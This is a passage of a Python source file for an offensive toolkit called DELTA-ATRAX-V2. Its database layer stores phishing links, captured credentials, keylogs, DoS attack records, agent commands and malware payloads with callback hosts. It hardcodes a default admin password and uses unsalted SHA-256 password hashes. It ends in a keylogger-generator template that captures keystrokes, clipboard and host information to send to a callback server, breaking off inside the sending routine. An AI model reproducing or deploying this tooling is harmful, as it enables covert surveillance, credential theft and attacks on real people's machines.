                id INTEGER PRIMARY KEY AUTOINCREMENT,
                agent_id TEXT NOT NULL,
                command TEXT NOT NULL,
                status TEXT DEFAULT 'pending',
                result TEXT,
                executed_at DATETIME,
                FOREIGN KEY (agent_id) REFERENCES agents(id)
            )
            """,
            # Network Packets
            """
            CREATE TABLE IF NOT EXISTS network_packets (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                source_ip TEXT,
                dest_ip TEXT,
                source_port INTEGER,
                dest_port INTEGER,
                protocol TEXT,
                size INTEGER,
                payload TEXT
            )
            """,
            # Performance Metrics
            """
            CREATE TABLE IF NOT EXISTS performance_metrics (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                cpu_percent REAL,
                memory_percent REAL,
                disk_percent REAL,
                network_sent INTEGER,
                network_recv INTEGER,
                connections_count INTEGER
            )
            """,
            # Deployments
            """
            CREATE TABLE IF NOT EXISTS deployments (
                id TEXT PRIMARY KEY,
                name TEXT NOT NULL,
                type TEXT NOT NULL,
                payload TEXT,
                target TEXT,
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                delivered BOOLEAN DEFAULT 0,
                opened BOOLEAN DEFAULT 0,
                executed BOOLEAN DEFAULT 0,
                data TEXT
            )
            """,
            # Clipboard History
            """
            CREATE TABLE IF NOT EXISTS clipboard_history (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                content TEXT,
                source TEXT
            )
            """,
            # DNS Cache
            """
            CREATE TABLE IF NOT EXISTS dns_cache (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                domain TEXT NOT NULL,
                ip TEXT NOT NULL,
                resolved_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                expires_at DATETIME
            )
            """,
            # Docker Scans
            """
            CREATE TABLE IF NOT EXISTS docker_scans (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                image TEXT NOT NULL,
                vulnerabilities TEXT,
                severity TEXT,
                scan_time REAL,
                success BOOLEAN DEFAULT 1
            )
            """,
            # Cracking Jobs
            """
            CREATE TABLE IF NOT EXISTS cracking_jobs (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                job_id TEXT UNIQUE NOT NULL,
                hash_type TEXT NOT NULL,
                hash_value TEXT NOT NULL,
                wordlist TEXT,
                status TEXT DEFAULT 'pending',
                result TEXT,
                started_at DATETIME,
                completed_at DATETIME,
                cracked BOOLEAN DEFAULT 0
            )
            """,
            # Reverse Engineering Jobs
            """
            CREATE TABLE IF NOT EXISTS reverse_engineering_jobs (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                job_id TEXT UNIQUE NOT NULL,
                file_path TEXT NOT NULL,
                analysis_type TEXT NOT NULL,
                result TEXT,
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                completed_at DATETIME,
                success BOOLEAN DEFAULT 1
            )
            """,
            # SaaS Tenants
            """
            CREATE TABLE IF NOT EXISTS tenants (
                id TEXT PRIMARY KEY,
                name TEXT NOT NULL,
                email TEXT NOT NULL,
                tier TEXT DEFAULT 'free',
                api_key TEXT UNIQUE,
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                active BOOLEAN DEFAULT 1,
                max_scans INTEGER DEFAULT 10,
                scans_used INTEGER DEFAULT 0,
                max_targets INTEGER DEFAULT 5,
                targets_count INTEGER DEFAULT 0,
                features TEXT
            )
            """,
            # API Keys
            """
            CREATE TABLE IF NOT EXISTS api_keys (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                key TEXT UNIQUE NOT NULL,
                tenant_id TEXT NOT NULL,
                name TEXT,
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                expires_at DATETIME,
                active BOOLEAN DEFAULT 1,
                permissions TEXT,
                rate_limit INTEGER DEFAULT 1000,
                requests_used INTEGER DEFAULT 0,
                FOREIGN KEY (tenant_id) REFERENCES tenants(id)
            )
            """,
            # Billing Records
            """
            CREATE TABLE IF NOT EXISTS billing_records (
                id TEXT PRIMARY KEY,
                tenant_id TEXT NOT NULL,
                amount REAL,
                currency TEXT DEFAULT 'USD',
                description TEXT,
                status TEXT DEFAULT 'pending',
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                paid_at DATETIME,
                FOREIGN KEY (tenant_id) REFERENCES tenants(id)
            )
            """,
            # Malware Payloads
            """
            CREATE TABLE IF NOT EXISTS malware_payloads (
                id TEXT PRIMARY KEY,
                name TEXT NOT NULL,
                payload_type TEXT NOT NULL,
                file_path TEXT,
                image_path TEXT,
                callback_host TEXT,
                callback_port INTEGER,
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                deployed BOOLEAN DEFAULT 0,
                deployment_count INTEGER DEFAULT 0
            )
            """,
            # Email Messages
            """
            CREATE TABLE IF NOT EXISTS email_messages (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                to_address TEXT NOT NULL,
                subject TEXT NOT NULL,
                body TEXT,
                from_address TEXT,
                html BOOLEAN DEFAULT 0,
                attachments TEXT,
                sent_at DATETIME,
                status TEXT DEFAULT 'draft',
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP
            )
            """,
            # Charts
            """
            CREATE TABLE IF NOT EXISTS charts (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                chart_type TEXT NOT NULL,
                title TEXT NOT NULL,
                data TEXT,
                file_path TEXT,
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP
            )
            """
        ]
        
        for sql in tables:
            try:
                self.conn.execute(sql)
            except Exception as e:
                print(f"Table creation error: {e}")
        
        self.conn.commit()
        self._create_default_admin()
    
    def _create_default_admin(self):
        try:
            default_password = "delta_atrax_2024"
            password_hash = hashlib.sha256(default_password.encode()).hexdigest()
            self.conn.execute(
                "INSERT OR IGNORE INTO users (username, password_hash, role) VALUES (?, ?, ?)",
                ("admin", password_hash, "admin")
            )
            self.conn.commit()
        except:
            pass
    
    def log_command(self, command: str, source: str = "local", platform: str = None,
                   user_id: str = None, success: bool = True, output: str = "",
                   execution_time: float = 0.0):
        try:
            self.conn.execute(
                """INSERT INTO command_history 
                   (command, source, platform, user_id, success, output, execution_time)
                   VALUES (?, ?, ?, ?, ?, ?, ?)""",
                (command, source, platform, user_id, success, output[:5000], execution_time)
            )
            self.conn.commit()
        except Exception as e:
            print(f"Failed to log command: {e}")
    
    def log_threat(self, threat_type: str, source_ip: str, severity: str, description: str):
        try:
            self.conn.execute(
                "INSERT INTO threats (threat_type, source_ip, severity, description) VALUES (?, ?, ?, ?)",
                (threat_type, source_ip, severity, description)
            )
            self.conn.commit()
        except Exception as e:
            print(f"Failed to log threat: {e}")
    
    def add_managed_ip(self, ip: str, domain: str = None, added_by: str = "system", notes: str = "") -> bool:
        try:
            ipaddress.ip_address(ip)
            self.conn.execute(
                "INSERT OR IGNORE INTO managed_ips (ip_address, domain, added_by, notes) VALUES (?, ?, ?, ?)",
                (ip, domain, added_by, notes)
            )
            self.conn.commit()
            return True
        except:
            return False
    
    def block_ip(self, ip: str, reason: str, executed_by: str = "system") -> bool:
        try:
            self.conn.execute(
                "UPDATE managed_ips SET is_blocked = 1, block_reason = ? WHERE ip_address = ?",
                (reason, ip)
            )
            self.conn.commit()
            return True
        except:
            return False
    
    def unblock_ip(self, ip: str) -> bool:
        try:
            self.conn.execute(
                "UPDATE managed_ips SET is_blocked = 0, block_reason = NULL WHERE ip_address = ?",
                (ip,)
            )
            self.conn.commit()
            return True
        except:
            return False
    
    def get_managed_ips(self, include_blocked: bool = True) -> List[Dict]:
        try:
            if include_blocked:
                rows = self.conn.execute("SELECT * FROM managed_ips ORDER BY added_date DESC")
            else:
                rows = self.conn.execute("SELECT * FROM managed_ips WHERE is_blocked = 0 ORDER BY added_date DESC")
            return [dict(row) for row in rows]
        except:
            return []
    
    def add_ssh_connection(self, conn: SSHConnection) -> bool:
        try:
            self.conn.execute(
                """INSERT OR REPLACE INTO ssh_connections 
                   (id, name, host, port, username, password_encrypted, key_path, status, created_at)
                   VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)""",
                (conn.id, conn.name, conn.host, conn.port, conn.username,
                 conn.password, conn.key_path, conn.status, conn.created_at)
            )
            self.conn.commit()
            return True
        except Exception as e:
            print(f"Failed to add SSH connection: {e}")
            return False
    
    def get_ssh_connections(self) -> List[Dict]:
        try:
            rows = self.conn.execute("SELECT * FROM ssh_connections ORDER BY name")
            return [dict(row) for row in rows]
        except:
            return []
    
    def log_ssh_command(self, connection_id: str, command: str, output: str,
                       exit_code: int, execution_time: float):
        try:
            self.conn.execute(
                """INSERT INTO ssh_commands 
                   (connection_id, command, output, exit_code, execution_time)
                   VALUES (?, ?, ?, ?, ?)""",
                (connection_id, command, output[:5000], exit_code, execution_time)
            )
            self.conn.commit()
        except Exception as e:
            print(f"Failed to log SSH command: {e}")
    
    def log_traffic(self, generator: TrafficGenerator, executed_by: str = "system"):
        try:
            self.conn.execute(
                """INSERT INTO traffic_logs 
                   (traffic_type, target_ip, target_port, duration, packets_sent, bytes_sent, status, executed_by)
                   VALUES (?, ?, ?, ?, ?, ?, ?, ?)""",
                (generator.traffic_type, generator.target_ip, generator.target_port,
                 generator.duration, generator.packets_sent, generator.bytes_sent,
                 generator.status, executed_by)
            )
            self.conn.commit()
        except Exception as e:
            print(f"Failed to log traffic: {e}")
    
    def log_nikto_scan(self, target: str, vulnerabilities: List[Dict], output_file: str,
                      scan_time: float, success: bool):
        try:
            self.conn.execute(
                """INSERT INTO nikto_scans (target, vulnerabilities, output_file, scan_time, success)
                   VALUES (?, ?, ?, ?, ?)""",
                (target, json.dumps(vulnerabilities), output_file, scan_time, success)
            )
            self.conn.commit()
        except Exception as e:
            print(f"Failed to log Nikto scan: {e}")
    
    def save_phishing_link(self, link: PhishingLink) -> bool:
        try:
            self.conn.execute(
                """INSERT INTO phishing_links (id, platform, phishing_url, template, created_at, clicks)
                   VALUES (?, ?, ?, ?, ?, ?)""",
                (link.id, link.platform, link.phishing_url, link.template, link.created_at, link.clicks)
            )
            self.conn.commit()
            return True
        except:
            return False
    
    def get_phishing_links(self, active_only: bool = True) -> List[Dict]:
        try:
            if active_only:
                rows = self.conn.execute("SELECT * FROM phishing_links WHERE active = 1 ORDER BY created_at DESC")
            else:
                rows = self.conn.execute("SELECT * FROM phishing_links ORDER BY created_at DESC")
            return [dict(row) for row in rows]
        except:
            return []
    
    def save_captured_credential(self, link_id: str, username: str, password: str,
                                 ip_address: str, user_agent: str):
        try:
            self.conn.execute(
                """INSERT INTO captured_credentials (phishing_link_id, username, password, ip_address, user_agent)
                   VALUES (?, ?, ?, ?, ?)""",
                (link_id, username, password, ip_address, user_agent)
            )
            self.conn.commit()
        except Exception as e:
            print(f"Failed to save credential: {e}")
    
    def get_captured_credentials(self, link_id: str = None) -> List[Dict]:
        try:
            if link_id:
                rows = self.conn.execute(
                    "SELECT * FROM captured_credentials WHERE phishing_link_id = ? ORDER BY timestamp DESC",
                    (link_id,)
                )
            else:
                rows = self.conn.execute("SELECT * FROM captured_credentials ORDER BY timestamp DESC")
            return [dict(row) for row in rows]
        except:
            return []
    
    def get_recent_threats(self, limit: int = 10) -> List[Dict]:
        try:
            rows = self.conn.execute(
                "SELECT * FROM threats ORDER BY timestamp DESC LIMIT ?", (limit,)
            )
            return [dict(row) for row in rows]
        except:
            return []
    
    def get_statistics(self) -> Dict:
        stats = {}
        try:
            stats['total_commands'] = self.conn.execute("SELECT COUNT(*) FROM command_history").fetchone()[0]
            stats['total_threats'] = self.conn.execute("SELECT COUNT(*) FROM threats").fetchone()[0]
            stats['total_managed_ips'] = self.conn.execute("SELECT COUNT(*) FROM managed_ips").fetchone()[0]
            stats['blocked_ips'] = self.conn.execute("SELECT COUNT(*) FROM managed_ips WHERE is_blocked = 1").fetchone()[0]
            stats['total_ssh_connections'] = self.conn.execute("SELECT COUNT(*) FROM ssh_connections").fetchone()[0]
            stats['total_traffic_tests'] = self.conn.execute("SELECT COUNT(*) FROM traffic_logs").fetchone()[0]
            stats['total_phishing_links'] = self.conn.execute("SELECT COUNT(*) FROM phishing_links").fetchone()[0]
            stats['captured_credentials'] = self.conn.execute("SELECT COUNT(*) FROM captured_credentials").fetchone()[0]
            stats['total_keylogs'] = self.conn.execute("SELECT COUNT(*) FROM keylogs").fetchone()[0]
            stats['total_dos_attacks'] = self.conn.execute("SELECT COUNT(*) FROM dos_attacks").fetchone()[0]
            stats['total_agents'] = self.conn.execute("SELECT COUNT(*) FROM agents").fetchone()[0]
            stats['total_deployments'] = self.conn.execute("SELECT COUNT(*) FROM deployments").fetchone()[0]
            stats['total_docker_scans'] = self.conn.execute("SELECT COUNT(*) FROM docker_scans").fetchone()[0]
            stats['total_cracking_jobs'] = self.conn.execute("SELECT COUNT(*) FROM cracking_jobs").fetchone()[0]
            stats['total_re_jobs'] = self.conn.execute("SELECT COUNT(*) FROM reverse_engineering_jobs").fetchone()[0]
            stats['total_tenants'] = self.conn.execute("SELECT COUNT(*) FROM tenants").fetchone()[0]
            stats['total_malware'] = self.conn.execute("SELECT COUNT(*) FROM malware_payloads").fetchone()[0]
            stats['total_emails'] = self.conn.execute("SELECT COUNT(*) FROM email_messages").fetchone()[0]
            stats['total_charts'] = self.conn.execute("SELECT COUNT(*) FROM charts").fetchone()[0]
        except:
            pass
        return stats
    
    def verify_user(self, username: str, password: str) -> Optional[Dict]:
        try:
            password_hash = hashlib.sha256(password.encode()).hexdigest()
            row = self.conn.execute(
                "SELECT * FROM users WHERE username = ? AND password_hash = ?",
                (username, password_hash)
            ).fetchone()
            return dict(row) if row else None
        except:
            return None
    
    def create_session(self, user_id: int) -> str:
        try:
            session_id = secrets.token_urlsafe(32)
            expires_at = datetime.now() + timedelta(hours=24)
            self.conn.execute(
                "INSERT INTO sessions (id, user_id, expires_at) VALUES (?, ?, ?)",
                (session_id, user_id, expires_at.isoformat())
            )
            self.conn.commit()
            return session_id
        except:
            return None
    
    def save_keylog(self, text: str, window: str = "", process: str = "", screenshot_path: str = ""):
        try:
            self.conn.execute(
                "INSERT INTO keylogs (text, window, process, screenshot_path) VALUES (?, ?, ?, ?)",
                (text[:5000], window[:100], process[:100], screenshot_path)
            )
            self.conn.commit()
        except Exception as e:
            print(f"Failed to save keylog: {e}")
    
    def get_keylogs(self, limit: int = 100) -> List[Dict]:
        try:
            rows = self.conn.execute("SELECT * FROM keylogs ORDER BY timestamp DESC LIMIT ?", (limit,))
            return [dict(row) for row in rows]
        except:
            return []
    
    def save_spear_phishing_campaign(self, campaign: 'SpearPhishingCampaign') -> bool:
        try:
            self.conn.execute(
                """INSERT OR REPLACE INTO spear_phishing_campaigns 
                   (id, name, template, subject, from_email, targets, sent_count, open_count, click_count, status, created_at, scheduled_time)
                   VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)""",
                (campaign.id, campaign.name, campaign.template, campaign.subject,
                 campaign.from_email, json.dumps(campaign.targets), campaign.sent_count,
                 campaign.open_count, campaign.click_count, campaign.status,
                 campaign.created_at, campaign.scheduled_time)
            )
            self.conn.commit()
            return True
        except Exception as e:
            print(f"Failed to save campaign: {e}")
            return False
    
    def log_dos_attack(self, attack_type: str, target: str, port: int, duration: int,
                      packets_sent: int, status: str, executed_by: str = "system"):
        try:
            self.conn.execute(
                """INSERT INTO dos_attacks 
                   (attack_type, target, port, duration, packets_sent, status, executed_by)
                   VALUES (?, ?, ?, ?, ?, ?, ?)""",
                (attack_type, target, port, duration, packets_sent, status, executed_by)
            )
            self.conn.commit()
        except Exception as e:
            print(f"Failed to log DOS attack: {e}")
    
    def get_dos_attacks(self, limit: int = 10) -> List[Dict]:
        try:
            rows = self.conn.execute("SELECT * FROM dos_attacks ORDER BY timestamp DESC LIMIT ?", (limit,))
            return [dict(row) for row in rows]
        except:
            return []
    
    def save_network_packet(self, source_ip: str, dest_ip: str, source_port: int,
                           dest_port: int, protocol: str, size: int, payload: str = ""):
        try:
            self.conn.execute(
                """INSERT INTO network_packets 
                   (source_ip, dest_ip, source_port, dest_port, protocol, size, payload)
                   VALUES (?, ?, ?, ?, ?, ?, ?)""",
                (source_ip, dest_ip, source_port, dest_port, protocol, size, payload[:1000])
            )
            self.conn.commit()
        except Exception as e:
            print(f"Failed to save network packet: {e}")
    
    def get_network_packets(self, limit: int = 100) -> List[Dict]:
        try:
            rows = self.conn.execute("SELECT * FROM network_packets ORDER BY timestamp DESC LIMIT ?", (limit,))
            return [dict(row) for row in rows]
        except:
            return []
    
    def save_deployment(self, deployment: 'Deployment') -> bool:
        try:
            self.conn.execute(
                """INSERT OR REPLACE INTO deployments 
                   (id, name, type, payload, target, created_at, delivered, opened, executed, data)
                   VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)""",
                (deployment.id, deployment.name, deployment.type, deployment.payload,
                 deployment.target, deployment.created_at, deployment.delivered,
                 deployment.opened, deployment.executed, "{}")
            )
            self.conn.commit()
            return True
        except Exception as e:
            print(f"Failed to save deployment: {e}")
            return False
    
    def get_deployments(self) -> List[Dict]:
        try:
            rows = self.conn.execute("SELECT * FROM deployments ORDER BY created_at DESC")
            return [dict(row) for row in rows]
        except:
            return []
    
    def save_docker_scan(self, image: str, vulnerabilities: List[Dict], severity: str,
                        scan_time: float, success: bool):
        try:
            self.conn.execute(
                """INSERT INTO docker_scans (image, vulnerabilities, severity, scan_time, success)
                   VALUES (?, ?, ?, ?, ?)""",
                (image, json.dumps(vulnerabilities), severity, scan_time, success)
            )
            self.conn.commit()
        except Exception as e:
            print(f"Failed to save Docker scan: {e}")
    
    def save_cracking_job(self, job_id: str, hash_type: str, hash_value: str, wordlist: str) -> bool:
        try:
            self.conn.execute(
                """INSERT INTO cracking_jobs (job_id, hash_type, hash_value, wordlist, status)
                   VALUES (?, ?, ?, ?, 'pending')""",
                (job_id, hash_type, hash_value, wordlist)
            )
            self.conn.commit()
            return True
        except Exception as e:
            print(f"Failed to save cracking job: {e}")
            return False
    
    def update_cracking_job(self, job_id: str, status: str, result: str = None, cracked: bool = False):
        try:
            self.conn.execute(
                """UPDATE cracking_jobs 
                   SET status = ?, result = ?, cracked = ?, completed_at = CURRENT_TIMESTAMP 
                   WHERE job_id = ?""",
                (status, result, cracked, job_id)
            )
            self.conn.commit()
        except Exception as e:
            print(f"Failed to update cracking job: {e}")
    
    def get_cracking_jobs(self, status: str = None) -> List[Dict]:
        try:
            if status:
                rows = self.conn.execute("SELECT * FROM cracking_jobs WHERE status = ? ORDER BY started_at DESC", (status,))
            else:
                rows = self.conn.execute("SELECT * FROM cracking_jobs ORDER BY started_at DESC")
            return [dict(row) for row in rows]
        except:
            return []
    
    def save_re_job(self, job_id: str, file_path: str, analysis_type: str, result: str) -> bool:
        try:
            self.conn.execute(
                """INSERT INTO reverse_engineering_jobs (job_id, file_path, analysis_type, result)
                   VALUES (?, ?, ?, ?)""",
                (job_id, file_path, analysis_type, result[:10000])
            )
            self.conn.commit()
            return True
        except Exception as e:
            print(f"Failed to save RE job: {e}")
            return False
    
    def get_re_jobs(self, limit: int = 20) -> List[Dict]:
        try:
            rows = self.conn.execute("SELECT * FROM reverse_engineering_jobs ORDER BY created_at DESC LIMIT ?", (limit,))
            return [dict(row) for row in rows]
        except:
            return []
    
    # ==================== SaaS Methods ====================
    
    def create_tenant(self, name: str, email: str, tier: str = "free") -> Optional[Tenant]:
        try:
            tenant_id = str(uuid.uuid4())[:8]
            api_key = f"dav2_{secrets.token_urlsafe(32)}"
            
            tier_limits = {
                "free": {"scans": 10, "targets": 5},
                "basic": {"scans": 100, "targets": 25},
                "professional": {"scans": 1000, "targets": 100},
                "enterprise": {"scans": 10000, "targets": 1000}
            }
            
            limits = tier_limits.get(tier, tier_limits["free"])
            
            self.conn.execute(
                """INSERT INTO tenants (id, name, email, tier, api_key, max_scans, max_targets)
                   VALUES (?, ?, ?, ?, ?, ?, ?)""",
                (tenant_id, name, email, tier, api_key, limits["scans"], limits["targets"])
            )
            self.conn.commit()
            
            return Tenant(
                id=tenant_id,
                name=name,
                email=email,
                tier=tier,
                api_key=api_key,
                created_at=datetime.now().isoformat(),
                max_scans=limits["scans"],
                max_targets=limits["targets"]
            )
        except Exception as e:
            print(f"Failed to create tenant: {e}")
            return None
    
    def get_tenant(self, tenant_id: str) -> Optional[Dict]:
        try:
            row = self.conn.execute(
                "SELECT * FROM tenants WHERE id = ?", (tenant_id,)
            ).fetchone()
            return dict(row) if row else None
        except:
            return None
    
    def get_tenant_by_api_key(self, api_key: str) -> Optional[Dict]:
        try:
            row = self.conn.execute(
                "SELECT * FROM tenants WHERE api_key = ? AND active = 1", (api_key,)
            ).fetchone()
            return dict(row) if row else None
        except:
            return None
    
    def get_all_tenants(self) -> List[Dict]:
        try:
            rows = self.conn.execute("SELECT * FROM tenants ORDER BY created_at DESC")
            return [dict(row) for row in rows]
        except:
            return []
    
    def save_malware_payload(self, payload: 'MalwarePayload') -> bool:
        try:
            self.conn.execute(
                """INSERT OR REPLACE INTO malware_payloads 
                   (id, name, payload_type, file_path, image_path, callback_host, callback_port, created_at)
                   VALUES (?, ?, ?, ?, ?, ?, ?, ?)""",
                (payload.id, payload.name, payload.payload_type, payload.file_path,
                 payload.image_path, payload.callback_host, payload.callback_port, payload.created_at)
            )
            self.conn.commit()
            return True
        except Exception as e:
            print(f"Failed to save malware payload: {e}")
            return False
    
    def get_malware_payloads(self) -> List[Dict]:
        try:
            rows = self.conn.execute("SELECT * FROM malware_payloads ORDER BY created_at DESC")
            return [dict(row) for row in rows]
        except:
            return []
    
    def save_email(self, email_msg: 'EmailMessage') -> bool:
        try:
            self.conn.execute(
                """INSERT INTO email_messages 
                   (to_address, subject, body, from_address, html, attachments, status, sent_at)
                   VALUES (?, ?, ?, ?, ?, ?, ?, ?)""",
                (email_msg.to, email_msg.subject, email_msg.body, email_msg.from_email,
                 1 if email_msg.html else 0, json.dumps(email_msg.attachments),
                 email_msg.status, email_msg.sent_at)
            )
            self.conn.commit()
            return True
        except Exception as e:
            print(f"Failed to save email: {e}")
            return False
    
    def get_emails(self, status: str = None, limit: int = 50) -> List[Dict]:
        try:
            if status:
                rows = self.conn.execute(
                    "SELECT * FROM email_messages WHERE status = ? ORDER BY created_at DESC LIMIT ?",
                    (status, limit)
                )
            else:
                rows = self.conn.execute(
                    "SELECT * FROM email_messages ORDER BY created_at DESC LIMIT ?",
                    (limit,)
                )
            emails = []
            for row in rows:
                email = dict(row)
                email['attachments'] = json.loads(email['attachments']) if email['attachments'] else []
                emails.append(email)
            return emails
        except Exception as e:
            print(f"Failed to get emails: {e}")
            return []
    
    def save_chart(self, chart_type: str, title: str, data: Dict, file_path: str) -> bool:
        try:
            self.conn.execute(
                """INSERT INTO charts (chart_type, title, data, file_path)
                   VALUES (?, ?, ?, ?)""",
                (chart_type, title, json.dumps(data), file_path)
            )
            self.conn.commit()
            return True
        except Exception as e:
            print(f"Failed to save chart: {e}")
            return False
    
    def get_charts(self, limit: int = 20) -> List[Dict]:
        try:
            rows = self.conn.execute("SELECT * FROM charts ORDER BY created_at DESC LIMIT ?", (limit,))
            return [dict(row) for row in rows]
        except:
            return []
    
    def close(self):
        try:
            self.conn.close()
        except:
            pass

# =====================
# CHART GENERATOR
# =====================
class ChartGenerator:
    def __init__(self, db: DatabaseManager, config: ConfigManager):
        self.db = db
        self.config = config
        self.charts_enabled = config.get('charts.enabled', True) and GRAPHICS_AVAILABLE
    
    def generate_bar_chart(self, title: str, labels: List[str], values: List[int], 
                           filename: str = None) -> Optional[str]:
        if not self.charts_enabled:
            return None
        
        try:
            fig, ax = plt.subplots(figsize=(10, 6))
            
            colors_list = ['#00d4ff', '#ff6b35', '#7b2cbf', '#00ff88', '#ffcc00', '#ff3366']
            bars = ax.bar(labels, values, color=colors_list[:len(labels)])
            
            ax.set_title(title, fontsize=16, color='white', fontweight='bold')
            ax.set_facecolor('#1a1a2e')
            fig.patch.set_facecolor('#0a0a1e')
            ax.tick_params(colors='white')
            
            for bar, value in zip(bars, values):
                ax.text(bar.get_x() + bar.get_width()/2, bar.get_height() + 0.5,
                       str(value), ha='center', color='white', fontweight='bold')
            
            plt.tight_layout()
            
            if not filename:
                filename = f"bar_chart_{int(time.time())}.png"
            
            file_path = os.path.join(CHARTS_DIR, filename)
            plt.savefig(file_path, dpi=150, bbox_inches='tight', facecolor='#0a0a1e')
            plt.close()
            
            self.db.save_chart('bar', title, {'labels': labels, 'values': values}, file_path)
            
            return file_path
        except Exception as e:
            logger.error(f"Bar chart generation error: {e}")
            return None
    
    def generate_pie_chart(self, title: str, labels: List[str], values: List[int],
                           filename: str = None) -> Optional[str]:
        if not self.charts_enabled:
            return None
        
        try:
            fig, ax = plt.subplots(figsize=(10, 8))
            
            colors_list = ['#00d4ff', '#ff6b35', '#7b2cbf', '#00ff88', '#ffcc00', '#ff3366']
            wedges, texts, autotexts = ax.pie(values, labels=labels, autopct='%1.1f%%',
                                               colors=colors_list[:len(labels)],
                                               textprops={'color': 'white'})
            
            ax.set_title(title, fontsize=16, color='white', fontweight='bold')
            fig.patch.set_facecolor('#0a0a1e')
            
            for autotext in autotexts:
                autotext.set_color('white')
                autotext.set_fontweight('bold')
            
            plt.tight_layout()
            
            if not filename:
                filename = f"pie_chart_{int(time.time())}.png"
            
            file_path = os.path.join(CHARTS_DIR, filename)
            plt.savefig(file_path, dpi=150, bbox_inches='tight', facecolor='#0a0a1e')
            plt.close()
            
            self.db.save_chart('pie', title, {'labels': labels, 'values': values}, file_path)
            
            return file_path
        except Exception as e:
            logger.error(f"Pie chart generation error: {e}")
            return None
    
    def generate_line_chart(self, title: str, x_data: List, y_data: List,
                            filename: str = None) -> Optional[str]:
        if not self.charts_enabled:
            return None
        
        try:
            fig, ax = plt.subplots(figsize=(12, 6))
            
            ax.plot(x_data, y_data, color='#00d4ff', linewidth=2, marker='o', markersize=6)
            ax.fill_between(range(len(y_data)), y_data, alpha=0.3, color='#00d4ff')
            
            ax.set_title(title, fontsize=16, color='white', fontweight='bold')
            ax.set_facecolor('#1a1a2e')
            fig.patch.set_facecolor('#0a0a1e')
            ax.tick_params(colors='white')
            ax.grid(True, alpha=0.2, color='white')
            
            plt.tight_layout()
            
            if not filename:
                filename = f"line_chart_{int(time.time())}.png"
            
            file_path = os.path.join(CHARTS_DIR, filename)
            plt.savefig(file_path, dpi=150, bbox_inches='tight', facecolor='#0a0a1e')
            plt.close()
            
            self.db.save_chart('line', title, {'x': list(x_data), 'y': list(y_data)}, file_path)
            
            return file_path
        except Exception as e:
            logger.error(f"Line chart generation error: {e}")
            return None
    
    def generate_statistics_charts(self) -> Dict[str, str]:
        stats = self.db.get_statistics()
        
        charts = {}
        
        # Bar chart for general stats
        bar_labels = ['Commands', 'Threats', 'IPs', 'Credentials', 'Keylogs']
        bar_values = [
            stats.get('total_commands', 0),
            stats.get('total_threats', 0),
            stats.get('total_managed_ips', 0),
            stats.get('captured_credentials', 0),
            stats.get('total_keylogs', 0)
        ]
        
        bar_path = self.generate_bar_chart('System Statistics', bar_labels, bar_values)
        if bar_path:
            charts['bar'] = bar_path
        
        # Pie chart for attack distribution
        pie_labels = ['Phishing', 'DOS', 'Traffic', 'Scans']
        pie_values = [
            stats.get('total_phishing_links', 0),
            stats.get('total_dos_attacks', 0),
            stats.get('total_traffic_tests', 0),
            stats.get('total_docker_scans', 0)
        ]
        
        if sum(pie_values) > 0:
            pie_path = self.generate_pie_chart('Attack Distribution', pie_labels, pie_values)
            if pie_path:
                charts['pie'] = pie_path
        
        return charts

# =====================
# MALWARE GENERATOR
# =====================
class MalwareGenerator:
    def __init__(self, db: DatabaseManager, config: ConfigManager):
        self.db = db
        self.config = config
        self.callback_host = config.get('malware.default_callback', 'localhost')
        self.callback_port = config.get('malware.default_port', 4444)
    
    def generate_keylogger_payload(self, name: str, callback_host: str = None, 
                                   callback_port: int = None) -> MalwarePayload:
        payload_id = str(uuid.uuid4())[:8]
        callback_host = callback_host or self.callback_host
        callback_port = callback_port or self.callback_port
        
        file_name = f"{name}_{payload_id}.py"
        file_path = os.path.join(MALWARE_DIR, file_name)
        
        payload_code = f'''#!/usr/bin/env python3
"""
DELTA-ATRAX-V2 Keylogger Payload
Generated for security testing purposes only
"""
import os
import sys
import time
import socket
import threading
import subprocess
import requests
import platform
import base64
import datetime
import json
from pathlib import Path

CALLBACK_HOST = "{callback_host}"
CALLBACK_PORT = {callback_port}
AGENT_ID = "{payload_id}"

try:
    from pynput import keyboard
    PYNPUT_AVAILABLE = True
except ImportError:
    PYNPUT_AVAILABLE = False

try:
    import pyautogui
    PYAUTOGUI_AVAILABLE = True
except ImportError:
    PYAUTOGUI_AVAILABLE = False

try:
    import pyperclip
    PYPERCLIP_AVAILABLE = True
except ImportError:
    PYPERCLIP_AVAILABLE = False

text = ""
current_window = ""
last_clipboard = ""
running = True

def get_system_info():
    return {{
        "agent_id": AGENT_ID,
        "hostname": socket.gethostname(),
        "os": platform.system() + " " + platform.release(),
        "ip": socket.gethostbyname(socket.gethostname()),
        "user": os.getlogin() if hasattr(os, 'getlogin') else "unknown",
        "pid": os.getpid()
    }}

def on_press(key):
    global text
    try:
        if key == keyboard.Key.enter:
            text += "\\n"
        elif key == keyboard.Key.tab:
            text += "\\t"
        elif key == keyboard.Key.space:
            text += " "
        elif key == keyboard.Key.backspace and len(text) > 0:
            text = text[:-1]
        elif hasattr(key, 'char') and key.char is not None:
            text += key.char
        
        if len(text) > 5000:
            send_data(text)
            text = ""
    except Exception as e:
        pass

def send_data(data):
    try:
        payload = {{
